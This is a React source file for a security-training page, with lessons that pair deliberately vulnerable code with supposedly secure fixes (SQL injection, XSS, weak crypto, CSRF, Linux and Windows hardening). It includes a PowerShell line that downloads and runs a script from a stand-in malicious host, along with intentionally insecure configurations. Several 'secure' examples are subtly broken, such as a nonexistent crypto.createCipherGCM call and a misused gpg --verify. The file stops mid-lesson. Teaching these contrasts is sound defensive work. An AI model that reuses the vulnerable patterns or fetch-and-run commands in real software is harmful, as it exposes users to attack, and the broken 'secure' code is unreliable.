import { useState } from "react";
import { useParams } from "react-router-dom";
import { 
  BookOpen, Code, Shield, Target, ChevronRight, Play, 
  CheckCircle, XCircle, AlertTriangle, Info, Copy,
  Eye, EyeOff, Lightbulb, Zap, Lock, Unlock, Terminal, Server
} from "lucide-react";
import { CommandPalette } from "../components/CommandPalette";
import { Header } from "../components/Header";
import { AppSidebar } from "../components/AppSidebar";
import { SidebarInset } from "@/components/ui/sidebar";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Progress } from "@/components/ui/progress";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Separator } from "@/components/ui/separator";
import { ScrollArea } from "@/components/ui/scroll-area";
import { useTheme } from "../hooks/useTheme";
import { useLanguage } from "../hooks/useLanguage";

// Educational content structure
const learnContent = {
  fundamentals: {
    "owasp-top10": {
      title: "OWASP Top 10 Security Risks",
      description: "Understanding the most critical security risks in web applications",
      progress: 0,
      totalLessons: 10,
      sections: [
        {
          id: "introduction",
          title: "Introduction to OWASP Top 10",
          type: "theory",
          content: {
            theory: `The OWASP Top 10 is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications.`,
            keyPoints: [
              "Updated regularly based on real-world data",
              "Industry standard for web security",
              "Foundation for secure development practices"
            ]
          }
        },
        {
          id: "injection",
          title: "A01: Injection Attacks",
          type: "practical",
          content: {
            theory: `Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query.`,
            vulnerability: {
              code: `// VULNERABLE CODE
$query = "SELECT * FROM users WHERE id = '" . $_GET['id'] . "'";
$result = mysql_query($query);`,
              explanation: "This code directly concatenates user input into SQL query, allowing SQL injection attacks."
            },
            secure: {
              code: `// SECURE CODE
$query = "SELECT * FROM users WHERE id = ?";
$stmt = $pdo->prepare($query);
$stmt->execute([$_GET['id']]);`,
              explanation: "Using prepared statements separates data from code, preventing injection attacks."
            },
            prevention: [
              "Use parameterized queries",
              "Validate and sanitize input", 
              "Implement least privilege principle"
            ]
          }
        }
      ]
    },
    "secure-coding": {
      title: "Secure Coding Principles",
      description: "Essential principles for writing secure code",
      progress: 30,
      totalLessons: 8,
      sections: [
        {
          id: "input-validation",
          title: "Input Validation",
          type: "practical",
          content: {
            theory: "Never trust user input. All input must be validated on both client and server side.",
            vulnerability: {
              code: `// VULNERABLE - No validation
function updateEmail(email) {
    document.getElementById('userEmail').innerHTML = email;
}`,
              explanation: "Directly inserting user input into DOM can lead to XSS attacks."
            },
            secure: {
              code: `// SECURE - Proper validation and encoding
function updateEmail(email) {
    if (isValidEmail(email)) {
        document.getElementById('userEmail').textContent = email;
    }
}`,
              explanation: "Input validation and safe DOM manipulation prevent XSS."
            }
          }
        }
      ]
    },
    "cryptography": {
      title: "Cryptography Fundamentals",
      description: "Essential cryptographic concepts for secure applications",
      progress: 0,
      totalLessons: 8,
      sections: [
        {
          id: "symmetric-encryption",
          title: "Symmetric Encryption Basics",
          type: "practical",
          content: {
            theory: "Symmetric encryption uses the same key for both encryption and decryption. It's fast and efficient for large amounts of data.",
            vulnerability: {
              code: `// VULNERABLE - Weak encryption
const crypto = require('crypto');
const algorithm = 'des'; // Weak algorithm
const key = '12345678'; // Weak key
const cipher = crypto.createCipher(algorithm, key);
let encrypted = cipher.update(data, 'utf8', 'hex');
encrypted += cipher.final('hex');`,
              explanation: "Using weak algorithms like DES and simple keys makes encryption vulnerable to attacks."
            },
            secure: {
              code: `// SECURE - Strong encryption
const crypto = require('crypto');
const algorithm = 'aes-256-gcm';
const key = crypto.randomBytes(32); // Strong random key
const iv = crypto.randomBytes(16);
const cipher = crypto.createCipherGCM(algorithm, key, iv);
let encrypted = cipher.update(data, 'utf8', 'hex');
encrypted += cipher.final('hex');
const authTag = cipher.getAuthTag();`,
              explanation: "Using AES-256-GCM with strong random keys provides robust encryption with authentication."
            },
            prevention: [
              "Use modern, strong algorithms (AES-256)",
              "Generate cryptographically secure random keys",
              "Implement proper key management",
              "Use authenticated encryption modes"
            ]
          }
        }
      ]
    },
    "authentication": {
      title: "Authentication Mechanisms",
      description: "Understanding various authentication methods and their security implications",
      progress: 0,
      totalLessons: 10,
      sections: [
        {
          id: "password-security",
          title: "Secure Password Handling",
          type: "practical",
          content: {
            theory: "Password security involves proper hashing, salting, and storage mechanisms to protect user credentials.",
            vulnerability: {
              code: `// VULNERABLE - Plain text storage
const users = [
    { username: 'admin', password: 'password123' },
    { username: 'user', password: 'mypassword' }
];
function login(username, password) {
    const user = users.find(u => u.username === username);
    return user && user.password === password;
}`,
              explanation: "Storing passwords in plain text exposes all user credentials if the database is compromised."
            },
            secure: {
              code: `// SECURE - Proper password hashing
const bcrypt = require('bcrypt');
const saltRounds = 12;

async function hashPassword(password) {
    return await bcrypt.hash(password, saltRounds);
}

async function verifyPassword(password, hash) {
    return await bcrypt.compare(password, hash);
}

// Storage: only hashed passwords
const users = [
    { username: 'admin', passwordHash: '$2b$12$...' }
];`,
              explanation: "Using bcrypt with proper salt rounds ensures passwords are securely hashed and cannot be easily reversed."
            },
            prevention: [
              "Never store passwords in plain text",
              "Use strong hashing algorithms (bcrypt, scrypt, Argon2)",
              "Implement proper salt generation",
              "Enforce strong password policies"
            ]
          }
        }
      ]
    },
    "authorization": {
      title: "Authorization and Access Control",
      description: "Implementing proper access control and authorization mechanisms",
      progress: 0,
      totalLessons: 9,
      sections: [
        {
          id: "rbac-implementation",
          title: "Role-Based Access Control (RBAC)",
          type: "practical",
          content: {
            theory: "RBAC assigns permissions to roles rather than individual users, simplifying access management and following the principle of least privilege.",
            vulnerability: {
              code: `// VULNERABLE - Direct permission checks
function deleteUser(currentUser, targetUserId) {
    // No proper authorization check
    if (currentUser.id !== targetUserId) {
        return database.deleteUser(targetUserId);
    }
    throw new Error('Cannot delete yourself');
}`,
              explanation: "Missing proper role-based authorization allows unauthorized access to sensitive operations."
            },
            secure: {
              code: `// SECURE - RBAC implementation
const roles = {
    ADMIN: ['create', 'read', 'update', 'delete'],
    MODERATOR: ['read', 'update'],
    USER: ['read']
};

function hasPermission(user, action) {
    return roles[user.role]?.includes(action) || false;
}

function deleteUser(currentUser, targetUserId) {
    if (!hasPermission(currentUser, 'delete')) {
        throw new Error('Insufficient permissions');
    }
    return database.deleteUser(targetUserId);
}`,
              explanation: "Proper RBAC implementation ensures users can only perform actions their role permits."
            },
            prevention: [
              "Implement role-based access control",
              "Follow principle of least privilege",
              "Regularly audit user permissions",
              "Use centralized authorization logic"
            ]
          }
        }
      ]
    }
  },
  "web-security": {
    "injection-attacks": {
      title: "Understanding Injection Attacks",
      description: "Deep dive into various injection attack vectors",
      progress: 60,
      totalLessons: 12,
      sections: [
        {
          id: "sql-injection-basics",
          title: "SQL Injection Fundamentals",
          type: "practical",
          content: {
            theory: "SQL Injection occurs when user input is directly incorporated into SQL queries without proper sanitization.",
            vulnerability: {
              code: `// VULNERABLE PHP CODE
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = '$id'";
$result = mysqli_query($connection, $query);`,
              explanation: "Direct string concatenation allows attackers to modify the SQL query structure."
            },
            secure: {
              code: `// SECURE PHP CODE
$id = $_GET['id'];
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
$result = $stmt->fetchAll();`,
              explanation: "Prepared statements prevent SQL injection by separating code from data."
            },
            prevention: [
              "Always use prepared statements",
              "Input validation and sanitization",
              "Principle of least privilege for database users",
              "Use stored procedures when appropriate"
            ]
          }
        }
      ]
    },
    "csrf-attacks": {
      title: "Cross-Site Request Forgery (CSRF)",
      description: "Understanding and preventing CSRF attacks in web applications",
      progress: 0,
      totalLessons: 6,
      sections: [
        {
          id: "csrf-fundamentals",
          title: "CSRF Attack Fundamentals",
          type: "practical",
          content: {
            theory: "CSRF attacks trick authenticated users into performing unwanted actions on web applications where they're authenticated.",
            vulnerability: {
              code: `<!-- VULNERABLE - No CSRF protection -->
<form action="/transfer-money" method="POST">
    <input type="hidden" name="to" value="attacker-account">
    <input type="hidden" name="amount" value="1000">
    <input type="submit" value="Click for free gift!">
</form>

// Server-side (no CSRF token validation)
app.post('/transfer-money', (req, res) => {
    const { to, amount } = req.body;
    transferMoney(req.user.id, to, amount);
    res.redirect('/success');
});`,
              explanation: "Without CSRF protection, malicious sites can trigger authenticated actions on behalf of users."
            },
            secure: {
              code: `<!-- SECURE - With CSRF token -->
<form action="/transfer-money" method="POST">
    <input type="hidden" name="_token" value="<%= csrfToken %>">
    <input type="text" name="to" required>
    <input type="number" name="amount" required>
    <input type="submit" value="Transfer">
</form>

// Server-side with CSRF protection
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.post('/transfer-money', csrfProtection, (req, res) => {
    const { to, amount } = req.body;
    transferMoney(req.user.id, to, amount);
    res.redirect('/success');
});`,
              explanation: "CSRF tokens ensure requests originate from legitimate forms, preventing cross-site request forgery."
            },
            prevention: [
              "Implement CSRF tokens for state-changing operations",
              "Use SameSite cookie attributes",
              "Validate origin and referer headers",
              "Require re-authentication for sensitive actions"
            ]
          }
        }
      ]
    },
    "session-management": {
      title: "Secure Session Management",
      description: "Best practices for handling user sessions securely",
      progress: 0,
      totalLessons: 8,
      sections: [
        {
          id: "session-security",
          title: "Session Security Implementation",
          type: "practical",
          content: {
            theory: "Proper session management involves secure session creation, storage, and destruction to prevent session-based attacks.",
            vulnerability: {
              code: `// VULNERABLE - Insecure session handling
const sessions = {};
app.post('/login', (req, res) => {
    if (validateCredentials(req.body)) {
        const sessionId = Math.random().toString(36);
        sessions[sessionId] = { userId: req.body.username };
        res.cookie('session', sessionId);
        res.send('Logged in');
    }
});`,
              explanation: "Predictable session IDs and insecure storage make sessions vulnerable to hijacking and fixation attacks."
            },
            secure: {
              code: `// SECURE - Secure session implementation
const session = require('express-session');
const MongoStore = require('connect-mongo');

app.use(session({
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    store: MongoStore.create({
        mongoUrl: process.env.MONGODB_URI
    }),
    cookie: {
        secure: true, // HTTPS only
        httpOnly: true, // Prevent XSS
        maxAge: 1800000, // 30 minutes
        sameSite: 'strict' // CSRF protection
    }
}));`,
              explanation: "Secure session configuration with proper storage, encryption, and cookie security prevents common attacks."
            },
            prevention: [
              "Use cryptographically secure session IDs",
              "Set secure cookie attributes (httpOnly, secure, sameSite)",
              "Implement session timeout and regeneration",
              "Store sessions securely server-side"
            ]
          }
        }
      ]
    }
  },
  "os-security": {
    "linux-security": {
      title: "Linux Security Fundamentals",
      description: "Essential security practices for Linux systems",
      progress: 0,
      totalLessons: 25,
      sections: [
        {
          id: "file-permissions",
          title: "File Permissions and Access Control",
          type: "practical",
          content: {
            theory: "Linux file permissions are fundamental to system security, controlling who can read, write, or execute files.",
            vulnerability: {
              code: `# VULNERABLE - Overly permissive permissions
chmod 777 /etc/passwd
chmod 755 /home/user/.ssh/private_key`,
              explanation: "Setting overly permissive permissions can expose sensitive files to unauthorized access."
            },
            secure: {
              code: `# SECURE - Proper permission settings
chmod 644 /etc/passwd
chmod 600 /home/user/.ssh/private_key
chown root:root /etc/passwd`,
              explanation: "Restrictive permissions ensure only authorized users can access sensitive files."
            },
            prevention: [
              "Follow principle of least privilege",
              "Regularly audit file permissions",
              "Use proper ownership settings",
              "Implement access control lists (ACLs) when needed"
            ]
          }
        },
        {
          id: "user-management",
          title: "User and Group Management",
          type: "practical",
          content: {
            theory: "Proper user and group management is essential for maintaining system security and controlling access to resources.",
            vulnerability: {
              code: `# VULNERABLE - Weak user management
useradd -m -s /bin/bash newuser
passwd newuser  # Setting weak password
usermod -aG sudo newuser  # Giving unnecessary sudo access
chmod 755 /home/newuser  # Overly permissive home directory`,
              explanation: "Poor user management practices can lead to privilege escalation and unauthorized access."
            },
            secure: {
              code: `# SECURE - Proper user management
useradd -m -s /bin/bash -G users newuser
passwd -e newuser  # Force password change on first login
# Set strong password policy in /etc/login.defs
usermod -L newuser  # Lock account until properly configured
chmod 700 /home/newuser  # Restrictive home directory
chage -M 90 -W 14 newuser  # Password expires in 90 days with 14-day warning`,
              explanation: "Secure user management includes proper permissions, password policies, and account restrictions."
            },
            prevention: [
              "Enforce strong password policies",
              "Use principle of least privilege for group membership",
              "Implement account lockout policies",
              "Regular audit of user accounts and permissions"
            ]
          }
        },
        {
          id: "ssh-hardening",
          title: "SSH Server Hardening",
          type: "practical",
          content: {
            theory: "SSH is a critical service that requires proper hardening to prevent unauthorized access and attacks.",
            vulnerability: {
              code: `# VULNERABLE - Default SSH configuration
# /etc/ssh/sshd_config
Port 22
PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords yes
X11Forwarding yes
MaxAuthTries 6`,
              explanation: "Default SSH configurations expose the system to brute force attacks and unauthorized access."
            },
            secure: {
              code: `# SECURE - Hardened SSH configuration
# /etc/ssh/sshd_config
Port 2222
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
PermitEmptyPasswords no
X11Forwarding no
MaxAuthTries 3
ClientAliveInterval 300
ClientAliveCountMax 2
AllowUsers admin developer
DenyUsers guest nobody`,
              explanation: "Hardened SSH configuration reduces attack vectors and implements security best practices."
            },
            prevention: [
              "Use non-standard ports",
              "Implement key-based authentication",
              "Restrict user access with AllowUsers/DenyUsers",
              "Configure connection timeouts and limits"
            ]
          }
        },
        {
          id: "log-monitoring",
          title: "System Log Monitoring and Analysis",
          type: "practical",
          content: {
            theory: "System logs provide crucial information for detecting security incidents and system anomalies.",
            vulnerability: {
              code: `# VULNERABLE - No log monitoring
# Default log rotation without analysis
# /etc/logrotate.conf
/var/log/*.log {
    daily
    rotate 7
    compress
}
# No alerting on security events`,
              explanation: "Without proper log monitoring, security incidents can go undetected for extended periods."
            },
            secure: {
              code: `# SECURE - Comprehensive log monitoring
# Install and configure rsyslog with remote logging
# /etc/rsyslog.conf
*.* @@logserver.company.com:514

# Configure fail2ban for intrusion detection
# /etc/fail2ban/jail.local
[sshd]
enabled = true
port = 2222
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600

# Set up log analysis with auditd
auditctl -w /etc/passwd -p wa -k passwd_changes
auditctl -w /etc/shadow -p wa -k shadow_changes`,
              explanation: "Comprehensive log monitoring includes centralized logging, automated analysis, and alerting."
            },
            prevention: [
              "Configure centralized logging",
              "Implement automated log analysis",
              "Set up real-time alerting for security events",
              "Regular log review and forensic analysis"
            ]
          }
        },
        {
          id: "process-monitoring",
          title: "Process and Service Monitoring",
          type: "practical",
          content: {
            theory: "Monitoring running processes and services helps detect malicious activity and system compromises.",
            vulnerability: {
              code: `# VULNERABLE - No process monitoring
# Running unnecessary services
systemctl status telnet
systemctl status ftp
systemctl status rsh
# No monitoring of process behavior
ps aux | grep suspicious  # Manual check only`,
              explanation: "Without process monitoring, malicious processes can run undetected on the system."
            },
            secure: {
              code: `# SECURE - Comprehensive process monitoring
# Disable unnecessary services
systemctl disable telnet ftp rsh
systemctl mask telnet ftp rsh

# Install and configure process monitoring
# Using osquery for process monitoring
SELECT pid, name, path, cmdline FROM processes 
WHERE name LIKE '%suspicious%' OR cmdline LIKE '%malicious%';

# Set up process baseline monitoring
# /etc/aide.conf - Advanced Intrusion Detection Environment
/usr/bin f+p+u+g+s+m+c+md5
/usr/sbin f+p+u+g+s+m+c+md5
/bin f+p+u+g+s+m+c+md5`,
              explanation: "Systematic process monitoring includes service hardening, behavioral analysis, and integrity checking."
            },
            prevention: [
              "Disable unnecessary services and processes",
              "Implement process whitelisting",
              "Monitor process behavior and resource usage",
              "Use integrity monitoring tools (AIDE, OSSEC)"
            ]
          }
        },
        {
          id: "kernel-security",
          title: "Kernel Security and Hardening",
          type: "practical",
          content: {
            theory: "Kernel hardening involves configuring kernel parameters and security modules to enhance system security.",
            vulnerability: {
              code: `# VULNERABLE - Default kernel configuration
# /etc/sysctl.conf - Default settings
net.ipv4.ip_forward = 1
net.ipv4.conf.all.send_redirects = 1
net.ipv4.conf.all.accept_redirects = 1
net.ipv4.conf.all.accept_source_route = 1
kernel.dmesg_restrict = 0`,
              explanation: "Default kernel settings may enable unnecessary features that increase attack surface."
            },
            secure: {
              code: `# SECURE - Hardened kernel configuration
# /etc/sysctl.conf - Security hardening
net.ipv4.ip_forward = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.all.log_martians = 1
net.ipv4.icmp_echo_ignore_broadcasts = 1
kernel.dmesg_restrict = 1
kernel.kptr_restrict = 2
kernel.yama.ptrace_scope = 1
fs.suid_dumpable = 0`,
              explanation: "Hardened kernel parameters disable unnecessary features and enable security protections."
            },
            prevention: [
              "Disable IP forwarding if not needed",
              "Enable kernel address space layout randomization",
              "Configure ptrace restrictions",
              "Regular kernel updates and security patches"
            ]
          }
        },
        {
          id: "filesystem-security",
          title: "Filesystem Security and Encryption",
          type: "practical",
          content: {
            theory: "Filesystem security involves proper mounting options, encryption, and access controls to protect data at rest.",
            vulnerability: {
              code: `# VULNERABLE - Insecure filesystem mounting
# /etc/fstab - Weak mounting options
/dev/sda1 / ext4 defaults 0 1
/dev/sda2 /home ext4 defaults 0 1
/dev/sda3 /tmp ext4 defaults 0 1
# No encryption for sensitive data`,
              explanation: "Default mount options and unencrypted filesystems leave data vulnerable to unauthorized access."
            },
            secure: {
              code: `# SECURE - Hardened filesystem configuration
# /etc/fstab - Security-focused mounting
/dev/sda1 / ext4 defaults,nodev 0 1
/dev/sda2 /home ext4 defaults,nodev,nosuid 0 1
/dev/sda3 /tmp ext4 defaults,nodev,nosuid,noexec 0 1
/dev/sda4 /var ext4 defaults,nodev 0 1
tmpfs /dev/shm tmpfs defaults,nodev,nosuid,noexec 0 0

# Setup LUKS encryption for sensitive partitions
cryptsetup luksFormat /dev/sda5
cryptsetup luksOpen /dev/sda5 encrypted_data
mkfs.ext4 /dev/mapper/encrypted_data`,
              explanation: "Secure mounting options and encryption protect against various attack vectors and data theft."
            },
            prevention: [
              "Use appropriate mount options (nodev, nosuid, noexec)",
              "Implement full disk encryption with LUKS",
              "Regular filesystem integrity checks",
              "Secure backup and recovery procedures"
            ]
          }
        },
        {
          id: "network-configuration",
          title: "Network Interface Security",
          type: "practical",
          content: {
            theory: "Network interface configuration affects system exposure and network-based attack vectors.",
            vulnerability: {
              code: `# VULNERABLE - Insecure network configuration
# Listening on all interfaces
netstat -tulpn | grep 0.0.0.0
# Unnecessary network services enabled
systemctl status cups
systemctl status avahi-daemon
# No network monitoring
tcpdump -i any  # Only manual monitoring`,
              explanation: "Insecure network configuration exposes services unnecessarily and lacks proper monitoring."
            },
            secure: {
              code: `# SECURE - Hardened network configuration
# Bind services to specific interfaces only
# /etc/ssh/sshd_config
ListenAddress 192.168.1.100

# Disable unnecessary network services
systemctl disable cups avahi-daemon
systemctl mask cups avahi-daemon

# Configure network monitoring
# Install and configure iptables logging
iptables -A INPUT -j LOG --log-prefix "IPTABLES-DROPPED: "
# Setup network intrusion detection
suricata -c /etc/suricata/suricata.yaml -i eth0`,
              explanation: "Secure network configuration limits service exposure and implements comprehensive monitoring."
            },
            prevention: [
              "Bind services to specific interfaces only",
              "Disable unnecessary network services",
              "Implement network intrusion detection",
              "Regular network security audits"
            ]
          }
        },
        {
          id: "backup-security",
          title: "Secure Backup and Recovery",
          type: "practical",
          content: {
            theory: "Secure backup strategies ensure data integrity and availability while protecting against various threats.",
            vulnerability: {
              code: `# VULNERABLE - Insecure backup practices
# Unencrypted backups
tar -czf backup.tar.gz /home/user/
cp backup.tar.gz /mnt/usb/  # Unencrypted storage
# No integrity verification
# Backups stored in same location as original data`,
              explanation: "Insecure backup practices can lead to data loss and exposure of sensitive information."
            },
            secure: {
              code: `# SECURE - Encrypted backup strategy
# Create encrypted backup with GPG
tar -czf - /home/user/ | gpg --cipher-algo AES256 --compress-algo 1 \\
  --symmetric --output backup_$(date +%Y%m%d).tar.gz.gpg

# Verify backup integrity
sha256sum backup_*.tar.gz.gpg > backup_checksums.txt
gpg --verify backup_checksums.txt

# Automated secure backup script
#!/bin/bash
BACKUP_DIR="/secure/backups"
DATE=$(date +%Y%m%d_%H%M%S)
tar -czf - /important/data | gpg --batch --yes --passphrase-file /secure/.passphrase \\
  --cipher-algo AES256 --symmetric --output "$BACKUP_DIR/backup_$DATE.tar.gz.gpg"`,
              explanation: "Secure backups use encryption, integrity verification, and proper storage separation."
            },
            prevention: [
              "Encrypt all backup data",
              "Implement automated backup verification",
              "Store backups in separate locations",
              "Regular backup and restore testing"
            ]
          }
        },
        {
          id: "incident-response",
          title: "Incident Response and Forensics",
          type: "practical",
          content: {
            theory: "Incident response procedures and forensic capabilities are crucial for handling security breaches effectively.",
            vulnerability: {
              code: `# VULNERABLE - No incident response plan
# No forensic tools installed
# No log preservation procedures
# Manual response only
find /var/log -name "*.log" -exec cat {} \\; | grep suspicious
# No evidence preservation`,
              explanation: "Lack of proper incident response procedures can lead to evidence loss and prolonged compromise."
            },
            secure: {
              code: `# SECURE - Comprehensive incident response setup
# Install forensic tools
apt-get install sleuthkit autopsy volatility-tools

# Setup log preservation
# /etc/rsyslog.conf - Long-term log retention
$WorkDirectory /var/spool/rsyslog
$ActionQueueFileName fwdRule1
$ActionQueueMaxDiskSpace 10g
$ActionResumeRetryCount -1

# Create incident response script
#!/bin/bash
# /usr/local/bin/incident_response.sh
INCIDENT_DIR="/forensics/incident_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$INCIDENT_DIR"

# Collect system information
ps aux > "$INCIDENT_DIR/processes.txt"
netstat -tulpn > "$INCIDENT_DIR/network.txt"
lsof > "$INCIDENT_DIR/open_files.txt"
last -f /var/log/wtmp > "$INCIDENT_DIR/login_history.txt"

# Create memory dump
dd if=/dev/mem of="$INCIDENT_DIR/memory_dump.raw" bs=1M`,
              explanation: "Proper incident response includes forensic tools, evidence preservation, and automated collection procedures."
            },
            prevention: [
              "Develop and test incident response procedures",
              "Install and maintain forensic tools",
              "Implement automated evidence collection",
              "Regular incident response training and drills"
            ]
          }
        }
      ]
    },
    "windows-security": {
      title: "Windows Security Essentials",
      description: "Core security concepts for Windows environments",
      progress: 0,
      totalLessons: 22,
      sections: [
        {
          id: "user-account-control",
          title: "User Account Control (UAC)",
          type: "theory",
          content: {
            theory: "UAC is a security feature that helps prevent unauthorized changes to the system by requiring elevation for administrative tasks.",
            keyPoints: [
              "Reduces attack surface by running with standard user privileges",
              "Prompts for elevation when administrative access is needed",
              "Can be configured through Group Policy",
              "Essential for defense in depth strategy"
            ]
          }
        },
        {
          id: "powershell-execution-policy",
          title: "PowerShell Execution Policy and Security",
          type: "practical",
          content: {
            theory: "PowerShell Execution Policy is a security feature that controls the conditions under which PowerShell loads configuration files and runs scripts. It helps prevent the execution of malicious scripts while allowing legitimate administrative tasks. Understanding and properly configuring execution policies is crucial for Windows security, as PowerShell is a powerful administrative tool that can be exploited by attackers if not properly secured.",
            vulnerability: {
              code: `# VULNERABLE - Unrestricted execution policy allows any script to run
# Check current execution policy
Get-ExecutionPolicy

# Setting dangerous unrestricted policy
Set-ExecutionPolicy Unrestricted -Force

# This allows ANY script to execute without warnings
# Including potentially malicious downloaded scripts
Invoke-WebRequest -Uri "http://malicious-site.com/script.ps1" -OutFile "script.ps1"
.\\script.ps1  # This would run without any security checks`,
              explanation: "Unrestricted execution policy removes all safety mechanisms, allowing any PowerShell script to execute automatically. This creates a significant security vulnerability as malicious scripts can run without user awareness or consent."
            },
            secure: {
              code: `# SECURE - Proper PowerShell security configuration
# Set restrictive execution policy for current user
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser

# For enterprise environments, use Group Policy to enforce
# Computer Configuration > Policies > Administrative Templates > 
# Windows Components > Windows PowerShell > Turn on Script Execution

# Check and verify current policy
Get-ExecutionPolicy -List

# Sign trusted scripts with code signing certificate
Set-AuthenticodeSignature -FilePath "trusted-script.ps1" -Certificate $cert

# Enable PowerShell logging for monitoring
# Enable Module Logging and Script Block Logging via Group Policy
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'}`,
              explanation: "RemoteSigned policy ensures that locally created scripts can run while requiring downloaded scripts to be signed by a trusted publisher. Combined with logging, this provides a balanced approach between security and functionality."
            },
            prevention: [
              "Use RemoteSigned or AllSigned execution policy in production",
              "Enable PowerShell script block logging and transcription",
              "Implement code signing for internal scripts",
              "Regular monitoring of PowerShell execution logs",
              "Use Constrained Language Mode for restricted environments"
            ]
          }
        },
        {
          id: "windows-firewall-advanced",
          title: "Windows Defender Firewall with Advanced Security",
          type: "practical",
          content: {
            theory: "Windows Defender Firewall with Advanced Security is a host-based firewall that provides network traffic filtering for Windows systems. It operates at the network layer and can control both inbound and outbound traffic based on various criteria including source/destination addresses, ports, protocols, and applications. Understanding advanced firewall configuration is essential for network security and compliance requirements.",
            vulnerability: {
              code: `# VULNERABLE - Firewall disabled or misconfigured
# Check if firewall is disabled (dangerous)
Get-NetFirewallProfile | Select-Object Name, Enabled

# Disabling firewall (NEVER do this in production)
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Overly permissive rules
New-NetFirewallRule -DisplayName "Allow All" -Direction Inbound -Action Allow

# No logging enabled for monitoring
Get-NetFirewallProfile | Select-Object Name, LogBlocked, LogAllowed`,
              explanation: "Disabling Windows Firewall or creating overly permissive rules removes critical network protection. Without proper logging, security incidents cannot be detected or investigated effectively."
            },
            secure: {
              code: `# SECURE - Properly configured Windows Firewall
# Enable firewall for all profiles
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True

# Configure default actions (block inbound, allow outbound)
Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultInboundAction Block
Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultOutboundAction Allow

# Create specific rules for required services
New-NetFirewallRule -DisplayName "Allow RDP" -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow -Profile Domain

# Enable comprehensive logging
Set-NetFirewallProfile -Profile Domain,Public,Private -LogBlocked True -LogAllowed True
Set-NetFirewallProfile -Profile Domain,Public,Private -LogFileName "C:\\Windows\\System32\\LogFiles\\Firewall\\pfirewall.log"

# Review and audit firewall rules regularly
Get-NetFirewallRule | Where-Object {$_.Enabled -eq "True"} | Select-Object DisplayName, Direction, Action`,
              explanation: "Proper firewall configuration uses default-deny policies with specific allow rules for required services. Comprehensive logging enables security monitoring and incident response."
            },
            prevention: [
              "Maintain default-deny inbound policy with specific exceptions",
              "Enable firewall logging for all profiles",
              "Regular audit of firewall rules and remove unused rules",
              "Use Group Policy for centralized firewall management",
              "Monitor firewall logs for suspicious activity"
            ]
          }
        },
        {
          id: "local-security-policy",
          title: "Local Security Policy Configuration",
          type: "practical",
          content: {
            theory: "Local Security Policy (secpol.msc) is a Microsoft Windows administrative tool that allows administrators to configure security settings for local computers. These policies control user rights, security options, password policies, account lockout policies, and audit policies. Proper configuration of local security policies is fundamental for maintaining system security and compliance with organizational security standards.",
            vulnerability: {
              code: `# VULNERABLE - Weak security policy settings
# Check current password policy (showing weak settings)
net accounts

# Example output showing weak policies:
# Minimum password length: 0
# Maximum password age: 42 days
# Account lockout threshold: Never
# Account lockout duration: 30 minutes

# Checking user rights assignments (showing excessive privileges)
whoami /priv

# Audit policy showing no auditing
auditpol /get /category:*`,
              explanation: "Weak password policies, excessive user privileges, and disabled auditing create multiple security vulnerabilities. Systems with no password requirements and no audit logging are particularly vulnerable to attack."
            },
            secure: {
              code: `# SECURE - Hardened local security policy configuration
# Configure strong password policy via command line
net accounts /minpwlen:12 /maxpwage:60 /minpwage:1 /uniquepw:12

# Set account lockout policy
net accounts /lockoutthreshold:5 /lockoutduration:30 /lockoutwindow:30

# Configure audit policy for comprehensive logging
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Account Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Process Creation" /success:enable
auditpol /set /subcategory:"Privilege Use" /success:enable /failure:enable

# Review and restrict user rights assignments
# Use secpol.msc GUI for detailed user rights management

# Enable additional security options via registry
reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v "RestrictAnonymous" /t REG_DWORD /d 1 /f
reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v "NoLMHash" /t REG_DWORD /d 1 /f`,
              explanation: "Strong password policies, proper account lockout settings, comprehensive auditing, and restrictive user rights assignments create multiple layers of security protection."
            },
            prevention: [
              "Enforce minimum 12-character password length",
              "Implement account lockout after 5 failed attempts",
              "Enable comprehensive audit logging for security events",
              "Regular review and restriction of user rights assignments",
              "Use Group Policy for enterprise-wide policy enforcement"
            ]
          }
        },
        {
          id: "windows-event-logs",
          title: "Windows Event Log Management and Security Monitoring",
          type: "practical",
          content: {
            theory: "Windows Event Logs are a centralized logging system that records system, security, and application events. Security professionals use these logs for incident detection, forensic analysis, and compliance monitoring. Understanding how to configure, manage, and analyze Windows Event Logs is crucial for maintaining situational awareness and detecting security incidents in Windows environments.",
            vulnerability: {
              code: `# VULNERABLE - Default logging configuration with limited retention
# Check default event log settings (typically small size and overwrite)
Get-WinEvent -ListLog * | Where-Object {$_.LogName -like "*Security*"} | Select-Object LogName, MaximumSizeInBytes, LogMode

# Default settings often show:
# MaximumSizeInBytes: 20971520 (20MB)
# LogMode: Circular (overwrites old events)

# No centralized log collection
# No security event monitoring or alerting
# Minimal audit policy enabled by default`,
              explanation: "Default event log settings provide insufficient storage and retention for security monitoring. Small log sizes and circular logging modes result in loss of critical security events needed for incident response and forensic analysis."
            },
            secure: {
              code: `# SECURE - Enhanced event log configuration for security monitoring
